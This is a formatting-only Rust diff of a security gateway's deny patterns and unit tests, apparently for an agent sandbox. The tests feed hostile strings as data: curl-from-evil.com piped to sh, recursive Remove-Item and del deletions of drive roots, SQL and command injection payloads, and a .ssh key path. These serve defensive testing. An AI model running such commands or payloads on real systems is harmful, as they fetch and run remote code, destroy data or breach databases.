@@ -31,8 +31,8 @@ pub enum SandboxPolicy {
 #[derive(Debug, Clone, PartialEq)]
 pub enum SecurityDecision {
     Allow,
-    NeedsApproval(String),  // Operation description
-    Deny(String),           // Hard block reason
+    NeedsApproval(String), // Operation description
+    Deny(String),          // Hard block reason
 }
 
 /// Security gateway that validates commands, URLs, file paths, and content.
@@ -62,7 +62,8 @@ impl SecurityGateway {
                 Regex::new(r"(?i)\bwget\b.*\|\s*(ba)?sh").expect("valid regex"),
                 Regex::new(r"(?i)\bdel\s+/s\s+/q\s+[a-z]:\\").expect("valid regex"),
                 Regex::new(r"(?i)\brd\s+/s\s+/q\s+[a-z]:\\").expect("valid regex"),
-                Regex::new(r"(?i)\bRemove-Item\s+.*-Recurse\s+-Force\s+[a-z]:\\").expect("valid regex"),
+                Regex::new(r"(?i)\bRemove-Item\s+.*-Recurse\s+-Force\s+[a-z]:\\")
+                    .expect("valid regex"),
                 Regex::new(r"(?i)\bdiskpart\b").expect("valid regex"),
             ],
             risky_patterns: vec![
@@ -344,7 +345,10 @@ mod tests {
     #[test]
     fn block_curl_pipe_sh() {
         let g = gw();
-        assert!(g.check_command("curl https://evil.com/script.sh | sh").is_err());
+        assert!(
+            g.check_command("curl https://evil.com/script.sh | sh")
+                .is_err()
+        );
         assert!(g.check_command("curl https://evil.com/s | bash").is_err());
         assert!(g.check_command("CURL https://x.com/a.sh | sh").is_err());
     }
@@ -373,12 +377,14 @@ mod tests {
     #[test]
     fn block_windows_remove_item_recursive() {
         let g = gw();
-        assert!(g
-            .check_command(r"Remove-Item foo -Recurse -Force C:\")
-            .is_err());
-        assert!(g
-            .check_command(r"Remove-Item bar -Recurse -Force D:\Windows")
-            .is_err());
+        assert!(
+            g.check_command(r"Remove-Item foo -Recurse -Force C:\")
+                .is_err()
+        );
+        assert!(
+            g.check_command(r"Remove-Item bar -Recurse -Force D:\Windows")
+                .is_err()
+        );
     }
 
     #[test]
@@ -456,10 +462,11 @@ mod tests {
     fn block_http_urls() {
         let g = gw();
         assert!(g.check_url("http://github.com/repo").is_err());
-        assert!(g
-            .check_url("http://github.com/repo")
-            .unwrap_err()
-            .contains("HTTPS"));
+        assert!(
+            g.check_url("http://github.com/repo")
+                .unwrap_err()
+                .contains("HTTPS")
+        );
     }
 
     #[test]
@@ -487,25 +494,25 @@ mod tests {
     #[test]
     fn allow_raw_githubusercontent() {
         let g = gw();
-        assert!(g
-            .check_url("https://raw.githubusercontent.com/owner/repo/main/file.txt")
-            .is_ok());
+        assert!(
+            g.check_url("https://raw.githubusercontent.com/owner/repo/main/file.txt")
+                .is_ok()
+        );
     }
 
     #[test]
     fn allow_api_github() {
         let g = gw();
-        assert!(g
-            .check_url("https://api.github.com/repos/owner/repo")
-            .is_ok());
+        assert!(
+            g.check_url("https://api.github.com/repos/owner/repo")
+                .is_ok()
+        );
     }
 
     #[test]
     fn allow_npmjs_registry() {
         let g = gw();
-        assert!(g
-            .check_url("https://registry.npmjs.org/express")
-            .is_ok());
+        assert!(g.check_url("https://registry.npmjs.org/express").is_ok());
     }
 
     #[test]
@@ -518,10 +525,11 @@ mod tests {
     fn block_non_allowlisted_domain() {
         let g = gw();
         assert!(g.check_url("https://evil.com/malware").is_err());
-        assert!(g
-            .check_url("https://evil.com/malware")
-            .unwrap_err()
-            .contains("allowlist"));
+        assert!(
+            g.check_url("https://evil.com/malware")
+                .unwrap_err()
+                .contains("allowlist")
+        );
         assert!(g.check_url("https://google.com/search").is_err());
         assert!(g.check_url("https://example.com/data").is_err());
     }
@@ -534,10 +542,11 @@ mod tests {
     fn block_localhost() {
         let g = gw();
         assert!(g.check_url("https://localhost/admin").is_err());
-        assert!(g
-            .check_url("https://localhost/admin")
-            .unwrap_err()
-            .contains("private"));
+        assert!(
+            g.check_url("https://localhost/admin")
+                .unwrap_err()
+                .contains("private")
+        );
     }
 
     #[test]
@@ -589,10 +598,7 @@ mod tests {
     fn block_unix_root() {
         let g = gw();
         assert!(g.check_path(Path::new("/")).is_err());
-        assert!(g
-            .check_path(Path::new("/"))
-            .unwrap_err()
-            .contains("root"));
+        assert!(g.check_path(Path::new("/")).unwrap_err().contains("root"));
     }
 
     #[test]
@@ -600,10 +606,7 @@ mod tests {
         let g = gw();
         assert!(g.check_path(Path::new("C:")).is_err());
         assert!(g.check_path(Path::new("D:")).is_err());
-        assert!(g
-            .check_path(Path::new("C:"))
-            .unwrap_err()
-            .contains("root"));
+        assert!(g.check_path(Path::new("C:")).unwrap_err().contains("root"));
     }
 
     #[test]
@@ -704,7 +707,11 @@ mod tests {
         std::fs::write(&test_file, "test").expect("write temp file");
         let result = g.check_path(&test_file);
         let _ = std::fs::remove_file(&test_file);
-        assert!(result.is_ok(), "temp file should be allowed: {:?}", test_file);
+        assert!(
+            result.is_ok(),
+            "temp file should be allowed: {:?}",
+            test_file
+        );
     }
 
     #[test]
@@ -725,10 +732,11 @@ mod tests {
     fn detect_sql_injection_or() {
         let g = gw();
         assert!(g.check_injection("' OR '1'='1").is_err());
-        assert!(g
-            .check_injection("' OR '1'='1")
-            .unwrap_err()
-            .contains("SQL injection"));
+        assert!(
+            g.check_injection("' OR '1'='1")
+                .unwrap_err()
+                .contains("SQL injection")
+        );
     }
 
     #[test]
@@ -766,7 +774,10 @@ mod tests {
     fn detect_sql_injection_union_select() {
         let g = gw();
         assert!(g.check_injection("UNION SELECT * FROM passwords").is_err());
-        assert!(g.check_injection("union select username from users").is_err());
+        assert!(
+            g.check_injection("union select username from users")
+                .is_err()
+        );
     }
 
     // ---------------------------------------------------------------
@@ -777,10 +788,11 @@ mod tests {
     fn detect_command_injection_double_ampersand() {
         let g = gw();
         assert!(g.check_injection("foo && bar").is_err());
-        assert!(g
-            .check_injection("foo && bar")
-            .unwrap_err()
-            .contains("command injection"));
+        assert!(
+            g.check_injection("foo && bar")
+                .unwrap_err()
+                .contains("command injection")
+        );
     }
 
     #[test]
@@ -803,7 +815,10 @@ mod tests {
     fn allow_clean_input() {
         let g = gw();
         assert!(g.check_injection("hello world").is_ok());
-        assert!(g.check_injection("SELECT * FROM users WHERE id = 5").is_ok());
+        assert!(
+            g.check_injection("SELECT * FROM users WHERE id = 5")
+                .is_ok()
+        );
         assert!(g.check_injection("normal search query").is_ok());
         assert!(g.check_injection("filename.txt").is_ok());
         assert!(g.check_injection("user@example.com").is_ok());
@@ -845,9 +860,7 @@ mod tests {
     fn default_has_all_allowed_domains() {
         let g = SecurityGateway::default();
         assert!(g.check_url("https://github.com/x").is_ok());
-        assert!(g
-            .check_url("https://raw.githubusercontent.com/x")
-            .is_ok());
+        assert!(g.check_url("https://raw.githubusercontent.com/x").is_ok());
         assert!(g.check_url("https://api.github.com/x").is_ok());
         assert!(g.check_url("https://registry.npmjs.org/x").is_ok());
         assert!(g.check_url("https://crates.io/x").is_ok());
@@ -970,7 +983,10 @@ mod tests {
     fn path_error_sensitive_message() {
         let g = gw();
         let err = g.check_path(Path::new("/home/user/.ssh/key")).unwrap_err();
-        assert!(err.contains(".ssh"), "Error should mention the sensitive path");
+        assert!(
+            err.contains(".ssh"),
+            "Error should mention the sensitive path"
+        );
     }
 
     #[test]
